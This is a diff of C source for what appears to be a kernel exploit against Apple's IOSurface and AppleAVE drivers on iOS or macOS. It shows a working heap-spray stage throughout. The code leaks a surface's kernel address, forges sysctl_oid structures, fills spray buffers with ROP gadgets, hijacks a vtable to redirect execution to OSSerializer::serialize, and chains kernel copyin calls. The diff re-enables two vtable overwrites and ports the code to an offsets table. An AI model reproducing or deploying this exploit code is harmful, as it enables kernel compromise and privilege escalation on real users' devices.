@@ -8,23 +8,23 @@ static io_connect_t g_surface_conn = 0;
 static uint32_t g_spraying_surface = 0;
 
 static uint32_t g_surface_id_to_leak_address = 0;
-static void * g_surface_kernel_address = NULL;
+static uint64_t g_surface_kernel_address = 0;
 
 static void * g_fake_sysctl_handlers = NULL;
 
 static void * g_new_sprayed_object = NULL;
 
 struct sysctl_oid {
-	void *oid_parent;
-	void * oid_link;
+	uint64_t oid_parent;
+	uint64_t oid_link;
 	int		oid_number;
 	int		oid_kind;
-	void		*oid_arg1;
+	void    *oid_arg1;
 	int		oid_arg2;
-	const char	*oid_name;
-	int 		(*oid_handler);
-	const char	*oid_fmt;
-	const char	*oid_descr; /* offsetof() field / long description */
+	uint64_t oid_name;
+	uint64_t 	oid_handler;
+	uint64_t oid_fmt;
+	uint64_t oid_descr; /* offsetof() field / long description */
 	int		oid_version;
 	int		oid_refcnt;
 };
@@ -45,6 +45,13 @@ void heap_spray_prepare_buffer_for_rop(uint64_t function, uint64_t arg0,
 }
 
 
+//void custom_heap_spray_buffer(uint64_t function, uint64_t arg0) {
+//    
+//    *(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x10) = arg0;
+//    *(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x18) = arg1;
+//    *(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x20) = function;
+//}
+
 
 /*
  * Function name: 	heap_spray_initialize_fake_sysctl_buffer
@@ -61,7 +68,7 @@ kern_return_t heap_spray_initialize_fake_sysctl_buffer() {
 	sysctl = (struct sysctl_oid *)malloc(SYSCTL_HANDLER_SIZE * 2);
 	if (NULL == sysctl)
 	{
-		printf("[ERROR]:  allocating 0x%x bytes for fake sysctls", SYSCTL_HANDLER_SIZE * 2);
+		printf("[ERROR]: allocating 0x%x bytes for fake sysctls", SYSCTL_HANDLER_SIZE * 2);
 		ret = KERN_MEMORY_ERROR;
 		goto cleanup;
 	}
@@ -76,13 +83,13 @@ kern_return_t heap_spray_initialize_fake_sysctl_buffer() {
 	sysctl->oid_handler = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	/* First parameter to OSSerializer::serialize */
-	*(void**)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER;
+	*(uint64_t*)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER;
 
 	/* Second parameter to OSSerializer::serialize */
-	*(unsigned long*)((char*)sysctl + 0x18) = IOSURFACE_KERNEL_OBJECT_SIZE;
+	*(unsigned long*)((char*)sysctl + 0x18) = OFFSET(iosurface_kernel_object_size);
 
 	/* This will call again to OSSerializer::serialize */
-	*(void**)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	sysctl->oid_fmt = offsets_get_kernel_base() + OFFSET(quad_format_string);
 	sysctl->oid_descr = offsets_get_kernel_base() + OFFSET(null_terminator);
@@ -97,13 +104,13 @@ kern_return_t heap_spray_initialize_fake_sysctl_buffer() {
 	sysctl->oid_handler = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	/* First parameter to OSSerializer::serialize */
-	*(void**)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER_EXECUTION;
+	*(uint64_t*)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER_EXECUTION;
 
 	/* Second parameter to OSSerializer::serialize */
-	*(unsigned long*)((char*)sysctl + 0x18) = IOSURFACE_KERNEL_OBJECT_SIZE;
+	*(unsigned long*)((char*)sysctl + 0x18) = OFFSET(iosurface_kernel_object_size);
 
 	/* This will call again to OSSerializer::serialize */
-	*(void**)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	sysctl->oid_fmt = offsets_get_kernel_base() + OFFSET(quad_format_string);
 	sysctl->oid_descr = offsets_get_kernel_base() + OFFSET(null_terminator);
@@ -165,10 +172,10 @@ kern_return_t heap_spray_init() {
 	
 	kern_return_t ret = KERN_SUCCESS;
 
-	g_new_sprayed_object = malloc(IOSURFACE_KERNEL_OBJECT_SIZE);
+	g_new_sprayed_object = malloc(OFFSET(iosurface_kernel_object_size));
 	if (NULL == g_new_sprayed_object)
 	{
-		printf("[ERROR]:  mallocing g_new_sprayed_object");
+		printf("[ERROR]: mallocing g_new_sprayed_object\n");
 		ret = KERN_MEMORY_ERROR;
 		goto cleanup;
 	}
@@ -176,34 +183,34 @@ kern_return_t heap_spray_init() {
 	ret = iosurface_utils_get_connection(&g_surface_conn);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  creating an IOSurface connection");
+		printf("[ERROR]: creating an IOSurface connection\n");
 		goto cleanup;
 	}
 
 	ret = iosurface_utils_create_surface(g_surface_conn, &g_spraying_surface, NULL);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  creating a spraying IOSurface object");
+		printf("[ERROR]: creating a spraying IOSurface object\n");
 		goto cleanup;
 	}
 
 	ret = iosurface_utils_create_surface(g_surface_conn, &g_surface_id_to_leak_address, NULL);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  creating surface for leak");
+		printf("[ERROR]: creating surface for leak\n");
 		goto cleanup;
 	}
 
-	printf("[INFO]: g_surface_id_to_leak_address %d", g_surface_id_to_leak_address);
+	printf("[INFO]: g_surface_id_to_leak_address %d\n", g_surface_id_to_leak_address);
 
 	ret = apple_ave_pwn_get_surface_kernel_address(g_surface_id_to_leak_address, &g_surface_kernel_address);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  leaking address for surface %d", g_surface_id_to_leak_address);
+		printf("[ERROR]: leaking address for surface %d\n", g_surface_id_to_leak_address);
 		goto cleanup;
 	}
 
-	printf("[INFO]: kernel address of surface %d is %p", g_surface_id_to_leak_address, g_surface_kernel_address);
+	printf("[INFO]: kernel address of surface %d is %llu\n", g_surface_id_to_leak_address, g_surface_kernel_address);
 
 
 cleanup:
@@ -225,29 +232,25 @@ static
 char * heap_spray_get_spraying_buffer(uint64_t object_address) {
 	
 	uint32_t i = 0;
-	char * data = malloc(IOSURFACE_KERNEL_OBJECT_SIZE);
+	char * data = malloc(OFFSET(iosurface_kernel_object_size));
 	if (NULL == data)
 	{
 		return data;
 	}
 
-	printf("[INFO]: ret_gadget: %llx", offsets_get_kernel_base() + OFFSET(ret_gadget));
+	printf("[INFO]: ret_gadget: %llx\n", offsets_get_kernel_base() + OFFSET(ret_gadget));
 
-	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
+	for(i = 0; i < OFFSET(iosurface_kernel_object_size); i += sizeof(uint64_t)) {
 		*(uint64_t*)(data+i) = offsets_get_kernel_base() + OFFSET(ret_gadget);
 	}
 
 	*(uint64_t*)(data) = object_address;
 	*(uint64_t*)(data + 0x8) = 0x100; 		/* We don't want to be freed. never. */
 
-	/* Just for the fun, doesn't really happen in normal flow */
-	*(uint64_t*)(data + 0x260) = offsets_get_kernel_base() + OFFSET(panic);
-
-	*(uint64_t*)(data + OFFSET(iosurface_vtable_offset_kernel_hijack)) =
-	offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)(data + OFFSET(iosurface_vtable_offset_kernel_hijack)) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 	
-	//*(void**)(data + 0x98) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);	
-	//*(void**)(data + 0xA0) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)(data + 0x98) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
+	*(uint64_t*)(data + 0xA0) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
 	/* OSSerializer::serialize(data + 0x234, SYSCTL_HANDLER_SIZE * 2) */
 	*(uint64_t*)(data + 0x10) = object_address + 0x234;
@@ -266,7 +269,7 @@ char * heap_spray_get_spraying_buffer(uint64_t object_address) {
 
 	/* So we can always modify this object */
 	*(void**)(data + SPRAY_SYSCTL_HELPER + 0x10) = g_new_sprayed_object;
-	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x18) = object_address;
+	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x18) = object_address; // object_address
 	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);
 
 	/* SPRAY_SYSCTL_HELPER_EXECUTION */
@@ -275,14 +278,14 @@ char * heap_spray_get_spraying_buffer(uint64_t object_address) {
 	*(void**)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x18) = (void*)0x1;
 	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);
 
-	//memset(data, 0x41414141, IOSURFACE_KERNEL_OBJECT_SIZE);
+	//memset(data, 0x41414141, OFFSET(iosurface_kernel_object_size));
 
-	memcpy(g_new_sprayed_object, data, IOSURFACE_KERNEL_OBJECT_SIZE);
-/*
-	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
-		printf("[INFO]: local_spray[0x%x] = %p", i, *(void**)(g_new_sprayed_object + i));
-	}
-*/
+	memcpy(g_new_sprayed_object, data, OFFSET(iosurface_kernel_object_size));
+
+//    for(i = 0; i < OFFSET(iosurface_kernel_object_size); i += sizeof(uint64_t)) {
+//		printf("[INFO]: local_spray[0x%x] = %p\n", i, *(void**)(g_new_sprayed_object + i));
+//	}
+
 	return data;
 }
 
@@ -306,43 +309,44 @@ kern_return_t heap_spray_start_spraying(uint64_t * kernel_allocated_data) {
 	ret = heap_spray_initialize_fake_sysctl_buffer();
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  initializing the fake sysctl buffer");
+		printf("[ERROR]: initializing the fake sysctl buffer\n");
 		goto cleanup;
 	}
 
+    // first step
 	data_to_spray = heap_spray_get_spraying_buffer(g_surface_kernel_address);
 	if (NULL == data_to_spray)
 	{
-		printf("[ERROR]:  allocating data for spraying");
+		printf("[ERROR]: allocating data for spraying\n");
 		goto cleanup;
 	}
 
-	data_to_spray_base64 = utils_get_base64_payload(data_to_spray, IOSURFACE_KERNEL_OBJECT_SIZE);
+	data_to_spray_base64 = utils_get_base64_payload(data_to_spray, OFFSET(iosurface_kernel_object_size));
 	if (NULL == data_to_spray_base64)
 	{
-		printf("[ERROR]:  converting data to base64");
+		printf("[ERROR]: converting data to base64\n");
 		goto cleanup;
 	}
 
 	ret = iosurface_utils_release_surface(g_surface_conn, g_surface_id_to_leak_address);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]:  freeing surface %d", g_surface_id_to_leak_address);
+		printf("[ERROR]: freeing surface %d\n", g_surface_id_to_leak_address);
 		goto cleanup;
 	}
 
 	g_surface_id_to_leak_address = 0;
-
-	for(i = 0; i < NUMBER_OF_OBJECTS_TO_SPRAY; ++i) {
+    
+    printf("[INFO]: spraying surface %x\n", g_spraying_surface);
+	
+    for(i = 0; i < NUMBER_OF_OBJECTS_TO_SPRAY; ++i) {
 		key[0] = key[0] + 1;
-		ret = iosurface_utils_set_value(g_surface_conn, g_spraying_surface, key_ptr, 
-			data_to_spray_base64);
-
-		if (KERN_SUCCESS != ret)
-		{
-			printf("[ERROR]:  setting value (i = %d)", i);
+		ret = iosurface_utils_set_value(g_surface_conn, g_spraying_surface, key_ptr, data_to_spray_base64);
+        
+		if (KERN_SUCCESS != ret) {
+			printf("[ERROR]: setting value (i = %d)\n", i);
 			goto cleanup;
-		}
+        }
 	}
 
 	*kernel_allocated_data = g_surface_kernel_address;
